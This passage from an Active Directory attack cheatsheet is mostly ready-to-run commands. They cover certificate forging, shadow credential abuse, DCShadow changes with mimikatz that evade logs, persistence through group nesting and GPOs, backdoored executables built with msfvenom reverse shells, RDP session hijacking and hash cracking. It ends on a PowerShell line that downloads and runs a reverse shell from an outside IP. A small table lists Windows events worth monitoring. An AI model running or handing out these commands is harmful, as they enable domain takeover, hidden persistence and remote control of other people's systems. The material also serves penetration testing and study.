<h4 id="ntlm-relay-to-ad-cs-rdp-endpoints-esc11_1">NTLM Relay to AD CS RDP Endpoints &ndash; ESC11</h4>
<p>By default, ADCS exposes an RPC endpoint for certificate enrollment called the <strong>MS-ICPR</strong>
<strong>RPC</strong> interface. </p>
<ul>
<li>The RPC protocol allows each interface to define its NTLM signature management policy. In the case of the MS-ICPR interface, the setting of the <code>IF_ENFORCEENCRYPTICERTREQUEST</code> flag determines whether the signature check is enabled.</li>
</ul>
<p><strong>The attack</strong>: When the certificate authority is not configured with <code>IF_ENFORCEENCRYPTICERTREQUEST</code>,  the RPC service vulnerable to NTLM relay attacks without signing, such as via SMB.</p>
<p>It's possible to use common <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#coerced-authentications">Coreced Authentications</a> methods to request a certificate from a template with <strong>domain computer enrollment</strong> and <strong>client authentication</strong> such as the default <strong>Machine</strong> template to compromised <strong>any computer</strong> coerced.</p>
<h4 id="forging-certificates-with-stolen-ca-certificates-dpersist1-golden-certificate">Forging Certificates with Stolen CA Certificates - DPERSIST1 (Golden Certificate)</h4>
<p>TODO</p>
<p>Convert <code>.pem</code> to <code>.pfx</code> with <code>openssl</code>:</p>
<div class="highlight"><pre><span></span><code>openssl<span class="w"> </span>pkcs12<span class="w"> </span>-in<span class="w"> </span>&lt;.pem<span class="w"> </span>certificate<span class="w"> </span>file<span class="w"> </span>path&gt;<span class="w"> </span>-keyex<span class="w"> </span>-CSP<span class="w"> </span><span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span><span class="w"> </span>-export<span class="w"> </span>-out<span class="w"> </span>&lt;output<span class="w"> </span>.pfx<span class="w"> </span>certificate<span class="w"> </span>file<span class="w"> </span>path&gt;
</code></pre></div>
<p>Use the private key to forge a new certificate impersonating Administrator with <a href="https://github.com/GhostPack/ForgeCert">ForgeCert</a>:</p>
<div class="highlight"><pre><span></span><code>ForgeCert.exe<span class="w"> </span>--CaCertPath<span class="w"> </span>&lt;pfx<span class="w"> </span>path&gt;<span class="w"> </span>--CaCertPassword<span class="w"> </span>&lt;pfx<span class="w"> </span>password&gt;<span class="w"> </span>--Subject<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>User<span class="w"> </span>--SubjectAltName<span class="w"> </span>&lt;user<span class="w"> </span>to<span class="w"> </span>impersonate&gt;@&lt;domain&gt;<span class="w"> </span>--NewCertPath<span class="w"> </span>&lt;pfx<span class="w"> </span>output<span class="w"> </span>path&gt;<span class="w"> </span>--NewCertPassword<span class="w"> </span>&lt;output<span class="w"> </span>pfx<span class="w"> </span>password&gt;
</code></pre></div>
<h4 id="trusting-rogue-ca-certificates-dpersist2">Trusting Rogue CA Certificates - DPERSIST2</h4>
<p>TODO</p>
<h4 id="malicious-misconfiguration-dpersist3">Malicious Misconfiguration - DPERSIST3</h4>
<p>TODO</p>
<h4 id="shadow-credential">Shadow Credential</h4>
<p>When an account has pre-authentication enabled, this will be validated the moment a TGS is requested. The validation can be <em>symmetric</em> (with a DES, RC4, AES128 or AES256 key) or <em>asymmetric</em> (with certificates). </p>
<ul>
<li><strong>Asymmetric Validation (PKINIT)</strong>: The client has a public-private key pair, and encrypts the pre-authentication data with their private key, and the KDC decrypts it with the client&rsquo;s public key. The KDC also has a public-private key pair, allowing for the exchange of a session key.<ul>
<li>Public keys are stored in the <code>msDS-KeyCredentialLink</code> attribute.</li>
</ul>
</li>
</ul>
<p><strong>The attack</strong>: abusing a user that has enough privileges to edit <code>msDS-KeyCredentialLink</code>,  an attacker would be able to create a key pair, append to raw public key in the attribute, and obtain persistent and stealthy access to the target object that can be a user or a computer as well.</p>
<ol>
<li>Create an RSA key pair</li>
<li>Create an X509 certificate configured with the public key</li>
<li>create a <strong>KeyCredential</strong> structure featuring the raw public key and add it to the <code>msDs-KeyCredentialLink</code> attribute</li>
<li>authenticate using PKINIT and the certificate and private key</li>
</ol>
<p><strong>Note</strong>: User objects can't edit their own <code>msDS-KeyCredentialLink</code> attribute while computer objects can only if a <strong>KeyCredential</strong> is not set already. <strong>This could be abused combining NTLM relay and shadow credential on the same computer to create a backdoor</strong>.</p>
<p><strong>Requirements</strong>:</p>
<ul>
<li><strong>REQ1</strong>: the domain must support PKINIT and contain at least one Domain Controller running Windows Server 2016 or above.</li>
<li><strong>REQ2</strong>: the Domain Controller must have its own key pair. This is generally true when AD CS is enabled.</li>
<li><strong>REQ3</strong>: an account that can edit the target object's <code>msDS-KeyCredentialLink</code> attribute.</li>
</ul>
<p>Enumerate current <em>KeyCredentials</em> with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>shadow<span class="w"> </span>list<span class="w"> </span>-username<span class="w"> </span>&lt;username&gt;@&lt;domain&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-account<span class="w"> </span>&lt;target<span class="w"> </span>account&gt;
</code></pre></div>
<p>Enumerate current <em>KeyCredentials</em> with <a href="https://github.com/ShutdownRepo/pywhisker">pyWhisker</a>:</p>
<div class="highlight"><pre><span></span><code>pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"&lt;username&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span>--target<span class="w"> </span><span class="s2">"&lt;target object's samname&gt;"</span><span class="w"> </span>--action<span class="w"> </span><span class="s2">"list"</span>
</code></pre></div>
<p>Automatically create a certificate and add it to the target's <code>msDS-KeyCredentialLink</code> with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>shadow<span class="w"> </span>add<span class="w"> </span>-username<span class="w"> </span>&lt;username&gt;@&lt;domain&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-account<span class="w"> </span>&lt;target<span class="w"> </span>account&gt;
</code></pre></div>
<p>Manually create a self-signed x509 certificate and generate the pfx:</p>
<div class="highlight"><pre><span></span><code>openssl<span class="w"> </span>req<span class="w"> </span>-newkey<span class="w"> </span>rsa:2048<span class="w"> </span>-nodes<span class="w"> </span>-keyout<span class="w"> </span>private.key<span class="w"> </span>-x509<span class="w"> </span>-days<span class="w"> </span><span class="m">365</span><span class="w"> </span>-out<span class="w"> </span>certificate.cer

openssl<span class="w"> </span>pkcs12<span class="w"> </span>-inkey<span class="w"> </span>private.key<span class="w"> </span>-in<span class="w"> </span>certificate.cer<span class="w"> </span>-export<span class="w"> </span>-out<span class="w"> </span>certificate.pfx
</code></pre></div>
<p>Add a new public key to target's <code>msDS-KeyCredentialLink</code> with <code>pyWhisker</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># PFX format</span>
pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"&lt;username&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span>--target<span class="w"> </span><span class="s2">"&lt;target object's samname&gt;"</span><span class="w"> </span>--action<span class="w"> </span><span class="s2">"add"</span><span class="w"> </span>--filename<span class="w"> </span><span class="s2">"&lt;.pfx path&gt;"</span>

<span class="c1"># PEM format</span>
pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"&lt;username&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span>--target<span class="w"> </span><span class="s2">"&lt;target object's samname&gt;"</span><span class="w"> </span>--action<span class="w"> </span><span class="s2">"add"</span><span class="w"> </span>--filename<span class="w"> </span><span class="s2">"&lt;.pem path&gt;"</span><span class="w"> </span>--export<span class="w"> </span>PEM
</code></pre></div>
<p><strong>Note</strong>: if providing a <code>.pfx</code> without a password, <code>pyWhisker</code> will encrypt it with a new randomly generated password (if not provided with the <code>-P</code> parameter). Take note of this password.</p>
<p>Use <code>certipy-ad</code> to authenticate with the <code>.pfx</code>; since <code>certipy-ad</code> does not support encrypted <code>.pfx</code>, first decrypt <code>.pfx</code> and then use it to authenticate:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Decrypt - not necessary if the KeyCredential was added with "certipy-ad shadow add"</span>
certipy-ad<span class="w"> </span>cert<span class="w"> </span>-pfx<span class="w"> </span>&lt;encrypted<span class="w"> </span>.pfx<span class="w"> </span>path&gt;<span class="w"> </span>-password<span class="w"> </span><span class="s2">"&lt;.pfx password&gt;"</span><span class="w"> </span>-export<span class="w"> </span>-out<span class="w"> </span>&lt;output<span class="w"> </span>filepath&gt;

<span class="c1"># Authenticate</span>
certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>&lt;decrypted<span class="w"> </span>.pfx&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w"> </span>-username<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-domain<span class="w"> </span>&lt;domain&gt;
</code></pre></div>
<p>Cleanup the attribute with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Cleanut the whole attribute</span>
certipy-ad<span class="w"> </span>shadow<span class="w"> </span>clear<span class="w"> </span>-username<span class="w"> </span>&lt;username&gt;@&lt;domain&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-account<span class="w"> </span>&lt;target<span class="w"> </span>account&gt;

<span class="c1"># Remove a specific entry</span>
certipy-ad<span class="w"> </span>shadow<span class="w"> </span>remove<span class="w"> </span>-username<span class="w"> </span>&lt;username&gt;@&lt;domain&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-account<span class="w"> </span>&lt;target<span class="w"> </span>account&gt;<span class="w"> </span>--device-id<span class="w"> </span>&lt;entry<span class="w"> </span>id&gt;
</code></pre></div>
<p>Cleanup the attribute with <code>pyWhisker</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Cleanup the whole attribute</span>
pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"&lt;username&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span>--target<span class="w"> </span><span class="s2">"&lt;target object's samname&gt;"</span><span class="w"> </span>--action<span class="w"> </span><span class="s2">"clear"</span>

<span class="c1"># Remove a specific entry</span>
pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"&lt;username&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span>--target<span class="w"> </span><span class="s2">"&lt;target object's samname&gt;"</span><span class="w"> </span>--action<span class="w"> </span><span class="s2">"remove"</span><span class="w"> </span>--device-id<span class="w"> </span><span class="s2">"&lt;entry id&gt;"</span>
</code></pre></div>
<p>Perform all previous operation with a all-in-one command with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span>-username<span class="w"> </span>&lt;username&gt;@&lt;domain&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-account<span class="w"> </span>&lt;target<span class="w"> </span>account&gt;
</code></pre></div>
<p>Perform a shadow credential relay attack with Impacket's <code>ntlmrelayx</code>:</p>
<div class="highlight"><pre><span></span><code>ntlmrelayx<span class="w"> </span>-t<span class="w"> </span>ldap://&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span>--shadow-credentials<span class="w"> </span>--shadow-target<span class="w"> </span><span class="s1">'&lt;target object samname&gt;'</span>
</code></pre></div>
<p>If getting <code>"self.client.entries[0] index out of range"</code> error, try skip privilege enumeration with <code>--no-validate-privs</code>.</p>
<p>To perform these operations from Windows, use <a href="https://github.com/eladshamir/Whisker">Whisker</a>.</p>
<h3 id="group-nesting_1">Group Nesting</h3>
<p><strong>Group Nesting</strong> is used to create a more organised structure in AD by mean of <strong>recursive groups</strong>. A recursive group is a group that is a member of another group. </p>
<p>Each nested groups inherits the privileges associated to the parent groups and adds more granular permissions and privileges to their subgroups.</p>
<ul>
<li>From the monitoring perspective, deep levels of nesting are harder to monitor.</li>
<li>From the attacking perspective, leveraging this reduced visibility to perform persistence can help avoid detection.</li>
</ul>
<p>Create a new group under an Organizational Unit:</p>
<div class="highlight"><pre><span></span><code><span class="nb">New-ADGroup</span> <span class="n">-Path</span> <span class="s2">"&lt;Parent OU DN&gt;"</span> <span class="n">-Name</span> <span class="s2">"New Group name"</span> <span class="n">-SamAccountName</span> <span class="s2">"new_group_name"</span> <span class="n">-DisplayName</span> <span class="s2">"New Group Name"</span> <span class="n">-GroupScope</span> <span class="n">Global</span> <span class="n">-GroupCategory</span> <span class="n">Security</span>
</code></pre></div>
<p>where:</p>
<ul>
<li><code>&lt;Parent OU DN&gt;</code>: is the Distinguished Name of the parent OU (eg: <code>OU=Parent1,OU=Parent2, DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?</code>)</li>
</ul>
<p>Add a user or a group as a member of another group:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Add-ADGroupMember</span> <span class="n">-Identity</span> <span class="s2">"&lt;parent_group_samaccountname&gt;"</span> <span class="n">-Members</span> <span class="s2">"&lt;group_to_add_samaccountname&gt;"</span>
</code></pre></div>
<p>Repeat the previous two command multiple time until the required level of nesting is reached. Then add the last group to the "Domain Admins" group and the compromised user to the last group.</p>
<p>Add a user or a group as member of another group using <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a>:</p>
<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">"&lt;DC ip&gt;"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"&lt;controlled user&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password|hashes&gt;"</span><span class="w"> </span>add<span class="w"> </span>groupMember<span class="w"> </span><span class="s2">"&lt;target group&gt;"</span><span class="w"> </span><span class="s2">"&lt;user|group to add&gt;"</span>
</code></pre></div>
<p>Remove a user or a group as member from another group using <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a>:</p>
<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">"&lt;DC ip&gt;"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"&lt;controlled user&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password|hashes&gt;"</span><span class="w"> </span>remove<span class="w"> </span>groupMember<span class="w"> </span><span class="s2">"&lt;target group&gt;"</span><span class="w"> </span><span class="s2">"&lt;user|group to add&gt;"</span>
</code></pre></div>
<h3 id="gpo-persistence">GPO Persistence</h3>
<p>In MMC:</p>
<ol>
<li>Click <strong>File</strong> -&gt; <strong>Add/Remove Snap-in</strong></li>
<li>Select and Add <strong>Group Policy Management</strong></li>
<li>Right-click on <strong>Group Policy Management</strong> and select <strong>Add Forest</strong></li>
<li>Enter the target domain and Click <strong>OK</strong></li>
<li>Find the policy of interest</li>
<li>Right-click on <strong>Edit</strong></li>
<li>Perform changes to the policy</li>
<li>Right-click on your policy and select Enforced*</li>
</ol>
<p>*Note: This ensures that the policy is applied even though there's a conflict with another policy. Moreover, this ensures that the GPO takes precedence to other policies (for example, defense policies  which could block or remove the changes of the attacker GPO).</p>
<p>The GPO can be used to run a script whenever a user logs in, to grant privileges to particular users or group, to disable some security features, etc.</p>
<h3 id="dcshadow">DCShadow</h3>
<p>This technique consists into temporarily registering a new DC in the target domain; this DC will then be used to alter the Active Directory environment, for example, by changing attributes such as <strong>SIDHistory</strong>, <strong>primaryGroupID</strong> and <strong>SPN</strong> on specified objects, like users or the <strong>AdminSDHolder</strong>, in order to achieve privilege escalation or creating backdoor.</p>
<ul>
<li>It's generally hard to detect these changes to the AD environment via event logs since they come from a DC and thus not logged.</li>
</ul>
<p>By default, Domain Admin privileges are required in order to push <strong>DCShadow</strong>'s changes. </p>
<ul>
<li>Alternatively, by setting particular permissions (modifying ACLs) for a less privileged user, it's possible to do the same without having Domain Admin privileges:</li>
</ul>
<table>
<thead>
<tr>
<th>Permission</th>
<th>Object</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td>DS-Install-Replica</td>
<td>Domain</td>
<td>Add/Remove Replica in Domain</td>
</tr>
<tr>
<td>DS-Replication-Manage-Topology</td>
<td>Domain</td>
<td>Manage Replication Topology</td>
</tr>
<tr>
<td>DS-Replication-Synchronize</td>
<td>Domain</td>
<td>Replication Synchornization</td>
</tr>
<tr>
<td>CreateChild</td>
<td>Sites object (and its children) in the Configuration container</td>
<td>Create child object</td>
</tr>
<tr>
<td>DeleteChild</td>
<td>Sites object (and its children) in the Configuration container</td>
<td>Delete child object</td>
</tr>
<tr>
<td>WriteProperty</td>
<td>Computer object registered as DC</td>
<td>Edit properties</td>
</tr>
<tr>
<td>WriteProperty</td>
<td>Target Object</td>
<td>Edit properties</td>
</tr>
</tbody>
</table>
<p>Anyway, setting these permissions involves the generation of change logs since these changes are not coming from a DC:</p>
<ul>
<li>An interesting strategy would be to use <strong>DCShadow</strong> to set this permissions in order to avoid logs generation  (Domain admin privileges or equivalent will then be necessary). This can be done by setting the correct ACEs in the <code>ntSecurityDescriptor</code> attribute on the objects listed in the previous table.</li>
</ul>
<p>Start a RPC server with SYSTEM privileges and setup changes to a object with <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code>!+
!processtoken

<span class="c1"># Single change</span>
lsadump::dcshadow<span class="w"> </span>/object:&lt;object<span class="w"> </span>distinguished<span class="w"> </span>name&gt;<span class="w"> </span>/attribute:&lt;attribute<span class="w"> </span>name&gt;<span class="w"> </span>/value<span class="o">=</span>&lt;attribute<span class="w"> </span>value&gt;

<span class="c1"># Multiple changes need the /stack option</span>
lsadump::dcshadow<span class="w"> </span>/stack<span class="w"> </span>/object:&lt;object<span class="w"> </span><span class="m">1</span><span class="w"> </span>distinguished<span class="w"> </span>name&gt;<span class="w"> </span>/attribute:&lt;attribute<span class="w"> </span>name&gt;<span class="w"> </span>/value<span class="o">=</span>&lt;attribute<span class="w"> </span>value&gt;
...
lsadump::dcshadow<span class="w"> </span>/stack<span class="w"> </span>/object:&lt;object<span class="w"> </span>N<span class="w"> </span>distinguished<span class="w"> </span>name&gt;<span class="w"> </span>/attribute:&lt;attribute<span class="w"> </span>name&gt;<span class="w"> </span>/value<span class="o">=</span>&lt;attribute<span class="w"> </span>value&gt;

lsadump::dcshadow
</code></pre></div>
<p>Note: Changed attribute are generally <code>SIDHistory</code> or <code>primaryGroupID</code>, used to elevate a user privileges.</p>
<p>Edit the AdminSDHolder object:</p>
<div class="highlight"><pre><span></span><code><span class="c"># Get current ACEs for the AdminSDHolder object</span>
<span class="p">(</span><span class="nb">New-Object</span>
<span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="s2">"&lt;CN=AdminSDHolder,CN=System,DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;"</span><span class="p">)).</span><span class="n">psbase</span><span class="p">.</span><span class="n">ObjectSecurity</span><span class="p">.</span><span class="n">sddl</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code>!+
!processtoken
lsadump::dcshadow
/object:<span class="s1">'&lt;CN=AdminSDHolder,CN=System,DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'</span><span class="w"> </span>/attribute:ntSecurityDescriptor<span class="w"> </span>/value:&lt;modified<span class="w"> </span>ACL&gt;
</code></pre></div>
<p>Note: <strong>previous command can be used to edit ACLs for any object!</strong></p>
<p>Push changes through AD; run the following command with enough privileges (Domain admin or otherwise):</p>
<div class="highlight"><pre><span></span><code>privilege::debug
lsadump::dcshadow<span class="w"> </span>/push
</code></pre></div>
<p>Use <a href="https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1">Set-DCShadowPermissions</a> to setup ACLs for a less privileged user in order to push DCShadows changes without a Domain Admin:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Set-DCShadowPermissions</span> <span class="n">-FakeDC</span> <span class="p">&lt;</span><span class="n">computer</span> <span class="n">from</span> <span class="n">which</span> <span class="n">running</span> <span class="n">DCShadow</span><span class="p">&gt;</span> <span class="n">-Object</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">object</span> <span class="n">name</span><span class="p">&gt;</span> <span class="n">-Username</span> <span class="p">&lt;</span><span class="n">user</span> <span class="n">getting</span> <span class="n">privileges</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Cleanup permissions:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Set-DCShadowPermissions</span> <span class="n">-FakeDC</span> <span class="p">&lt;</span><span class="n">computer</span> <span class="n">from</span> <span class="n">which</span> <span class="n">running</span> <span class="n">DCShadow</span><span class="p">&gt;</span> <span class="n">-Object</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">object</span> <span class="n">name</span><span class="p">&gt;</span> <span class="n">-Username</span> <span class="p">&lt;</span><span class="n">user</span> <span class="n">getting</span> <span class="n">privileges</span><span class="p">&gt;</span> <span class="n">-Verbose</span> <span class="n">-Remove</span>
</code></pre></div>
<p>Note: <strong>this script DOES generate logs!</strong> </p>
<h3 id="backdoors">Backdoors</h3>
<p>Inject a backdoor into a legitimate <code>exe</code>:</p>
<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-a<span class="w"> </span>x64<span class="w"> </span>--platform<span class="w"> </span>windows<span class="w"> </span>-x<span class="w"> </span>&lt;exe<span class="w"> </span>file<span class="w"> </span>path&gt;<span class="w"> </span>-k<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">lhost</span><span class="o">=</span>&lt;attacker_ip&gt;<span class="w"> </span><span class="nv">lport</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">"\x00"</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>&lt;output<span class="w"> </span>exe<span class="w"> </span>file<span class="w"> </span>path&gt;
</code></pre></div>
<p>Create an exe to be used in a service with msfvenom:</p>
<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell/reverse_tcp<span class="w"> </span>-f<span class="w"> </span>exe-service<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;attacker<span class="w"> </span>ip&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-o<span class="w"> </span>&lt;output<span class="w"> </span>exe<span class="w"> </span>file<span class="w"> </span>path&gt;
</code></pre></div>
<p>Note: service executables are different from standard .exe files; non-service executables get killed by the service manager almost immediately.</p>
<p><strong>RDP hijacking</strong>: When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely.
    - Having <code>SYSTEM</code> privileges on a <strong>Windows Server 2016 or earlier,</strong> allows an attacker to take over any existing RDP session without requiring a password.
    - From Windows Server 2019 and upward, it's not possible to connect to another user's session without its password.
    - Note that taking over <strong>active</strong> sessions disconnects the legitimate users, enhancing the possibility to be detected.</p>
<div class="highlight"><pre><span></span><code><span class="c1"># If current user is not nt authority\system, open a shell as Administrator</span>
PsExec64.exe<span class="w"> </span>-s<span class="w"> </span>cmd.exe

<span class="c1"># List current active sessions: look for sessions in Disc state (sessions currently opened but not used)</span>
query<span class="w"> </span>user
query<span class="w"> </span>sessions

<span class="c1"># Connect to a session</span>
tscon.exe<span class="w"> </span>&lt;session<span class="w"> </span>id<span class="w"> </span>or<span class="w"> </span>session<span class="w"> </span>anme&gt;<span class="w"> </span>/dest:&lt;current<span class="w"> </span>session<span class="w"> </span>name<span class="w"> </span>or<span class="w"> </span><span class="s2">"console"</span>&gt;

<span class="c1"># Clear session</span>
logoff<span class="w"> </span>&lt;session<span class="w"> </span>id<span class="w"> </span>or<span class="w"> </span>session<span class="w"> </span>name&gt;
</code></pre></div>
<h2 id="evasion_1">Evasion</h2>
<p>TODO
https://www.reddit.com/r/HowToHack/comments/16pxfl4/comment/k220pl8/?context=3
https://github.com/anonymous300502/Nuke-AMSI</p>
<h2 id="monitoring">Monitoring</h2>
<p>Interesting Windows Events to monitor:</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Description</th>
<th>Attacks</th>
</tr>
</thead>
<tbody>
<tr>
<td>4624</td>
<td>Account Logon</td>
<td>Golden Ticket, Silver Ticket</td>
</tr>
<tr>
<td>4672</td>
<td>Admin Logon</td>
<td>Golden Ticket, Silver Ticket</td>
</tr>
<tr>
<td>4634</td>
<td>Account Logoff</td>
<td>Silver Ticket</td>
</tr>
<tr>
<td>7045</td>
<td>New Service Installed</td>
<td>Skeleton Key</td>
</tr>
<tr>
<td>4673</td>
<td>Sensitive privileges used (eg., <strong>SeSystemtimePrivilege</strong>, <strong>SeCreateGlobalPrivilege</strong>, or <strong>SeTcbPrivilege</strong>)</td>
<td>Skeleton Key</td>
</tr>
<tr>
<td>4611</td>
<td>A trusted logon process has been registered with the Local Security Authority</td>
<td>Skeleton Key</td>
</tr>
<tr>
<td>4657</td>
<td>Changes to HKLM:\System\CurrentControlSet\Control\Lsa\ DsrmAdminLogonBehavior</td>
<td>DSRM</td>
</tr>
<tr>
<td>4657</td>
<td>Changes to HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages</td>
<td>SSP attacks</td>
</tr>
<tr>
<td>4769</td>
<td>A Kerberos ticket was requested</td>
<td>Kerberoasting</td>
</tr>
<tr>
<td>4662</td>
<td>An operation was performed on an object</td>
<td>ACL Attacks</td>
</tr>
<tr>
<td>5136</td>
<td>A directory service object was modified</td>
<td>ACL Attacks</td>
</tr>
<tr>
<td>4670</td>
<td>Permissions on an object were changed</td>
<td>ACL Attacks</td>
</tr>
</tbody>
</table>
<h2 id="misc">Misc</h2>
<p>Enable logging on <code>mimikatz</code> (useful for long e continuous outputs):</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Set the log file for the next command</span>
log<span class="w"> </span>&lt;log<span class="w"> </span>file<span class="w"> </span>path&gt;
&lt;mimikatz<span class="w"> </span>command&gt;
</code></pre></div>
<p>Force computer policy sync with DC:</p>
<div class="highlight"><pre><span></span><code><span class="n">gpupdate</span> <span class="p">/</span><span class="n">force</span>
</code></pre></div>
<p>Crack NTLM hash with <code>hashcat</code>:</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>&lt;hashes<span class="w"> </span>file&gt;<span class="w"> </span>&lt;wordlist&gt;
</code></pre></div>
<p>Crack NetNTLMv2 hash with <code>hashcat</code>:</p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>&lt;hashes<span class="w"> </span>file&gt;<span class="w"> </span>&lt;wordlist&gt;
</code></pre></div>
<p>Manually Import the Active Directory PowerShell module (copy it from a Windows Server instance having the module installed):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span>
<span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">psd1</span>
</code></pre></div>
<p>where:</p>
<ul>
<li><strong>Microsoft.ActiveDirectory.Management.dll</strong>: generally located at <code>C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management</code></li>
<li><strong>ActiveDirectory.psd1</strong>: generally located at <code>C:\Windows\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory</code></li>
</ul>
<p>Execute DLL (useful for testing purposes):</p>
<div class="highlight"><pre><span></span><code>rundll32.exe<span class="w"> </span>&lt;dll<span class="w"> </span>path&gt;,&lt;dll<span class="w"> </span>entry<span class="w"> </span>point&gt;
</code></pre></div>
<p>Get Windows Event object:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-FilterHashtable</span> <span class="p">@{</span><span class="n">Logname</span><span class="p">=&lt;</span><span class="n">event</span> <span class="n">type</span><span class="p">&gt;,</span><span class="n">ID</span><span class="p">=&lt;</span><span class="n">event</span> <span class="n">ID</span><span class="p">&gt;}</span> <span class="n">-MaxEvents</span> <span class="n">1</span> <span class="p">|</span> <span class="nb">Format-List</span> <span class="n">-Property</span> <span class="p">*</span>
</code></pre></div>
<p><strong>Note</strong>: event type is generally 'Security'</p>
<p>Download reverse shell for a Metasploit listener:</p>
<div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">"(New-Object System.Net.WebClient).Downloadfile('[http://10.9.6.99:8099/revshell.exe',](http://10.9.6.99:8099/revshell.exe',) 'revshell.exe') ; Start-Process revshell.exe -Wait"</span>
</code></pre></div>
<p><strong>Note</strong>: <code>Start Process</code> is launched with the <code>-Wait</code> option since otherwise session could be immediately closed.</p>
<p>In-memory PowerShell reverse shell:</p>
